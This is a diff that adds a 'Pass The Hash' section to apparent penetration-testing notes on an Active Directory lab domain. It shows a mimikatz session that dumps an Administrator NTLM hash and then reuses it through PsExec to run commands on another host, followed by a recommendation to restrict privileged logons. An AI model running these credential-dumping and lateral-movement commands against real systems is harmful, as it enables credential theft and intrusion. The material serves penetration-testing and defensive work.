@@ -245,6 +245,91 @@ We recommend ensuring service account passwords are longer than 25 characters.
 References:
 https://docs.microsoft.com/en-us/windows-server/networking/sdn/security/kerberos-with-spn
 ```
+
+
+#### Pass The Hash
+
+```
+c:\Users\fcastle\Desktop>mimikatz.exe
+
+    lovekatz 2.2.0 (x64) #18362 Jan  9 2020 19:32:44
+  "lolxd" - (oe.eo)
+
+       >       -KATZ
+          > https:// ***/
+
+lovekatz # privilege::debug
+Privilege '20' OK
+
+lovekatz # sekurlsa::logonPasswords
+
+Authentication Id : 0 ; 5532529 (00000000:00546b71)
+Session           : Interactive from 2
+User Name         : Administrator
+Domain            : MARVEL
+Logon Server      : HYDRA
+Logon Time        : 1/10/2020 1:55:10 AM
+SID               : S-1-5-21-1806573636-3987246654-2051155295-500
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : MARVEL
+         * NTLM     : 58a478135a93ac3bf058a5ea0e8fdb71
+         * SHA1     : 0d7d930ac3b1322c8a1142f9b22169d4eef9e855
+         * DPAPI    : aceb14854d9c0a836f48b7a1760bd14a
+        tspkg :
+        kerberos :
+         * Username : Administrator
+         * Domain   : MARVEL.LOCAL
+         * Password : (null)
+        ssp :
+        CredMAN :
+[...]
+
+
+
+
+lovekatz # sekurlsa::pth /user:Administrator /domain:MARVEL /ntlm:58a478135a93ac3bf058a5ea0e8fdb71 /run:"C:\Users\fcastle\Desktop\PsExec64.exe \\192.168.22.211 whoami"
+user    : Administrator
+domain  : MARVEL
+program : C:\Users\fcastle\Desktop\PsExec64.exe \\192.168.22.211 whoami
+impers. : no
+NTLM    : 58a478135a93ac3bf058a5ea0e8fdb71
+  |  PID  1984
+  |  TID  3820
+  |  LSA Process was already R/W
+  |  LUID 0 ; 9099117 (00000000:008ad76d)
+  \_ msv1_0   - data copy @ 000001E3DDFEA680 : OK !
+  \_ kerberos - data copy @ 000001E3DE0715D8
+   \_ aes256_hmac       -> null
+   \_ aes128_hmac       -> null
+   \_ rc4_hmac_nt       OK
+   \_ rc4_hmac_old      OK
+   \_ rc4_md4           OK
+   \_ rc4_hmac_nt_exp   OK
+   \_ rc4_hmac_old_exp  OK
+   \_ *Password replace @ 000001E3DDF34DE8 (32) -> null
+```
+
+Output from second terminal
+
+```
+PsExec v2.2 - Execute processes remotely
+Copyright (C) 2001-2016 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+
+marvel\administrator
+whoami exited on 192.168.22.211 with error code 0.
+```
+
+Recommendations:
+```
+Implement logon restrictions so your privileged account hashes are never stored where they can be extracted.
+References:
+https://docs.microsoft.com/pl-pl/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material?redirectedfrom=MSDN
+```
+
 =========================
 #### Useful Powershell
 
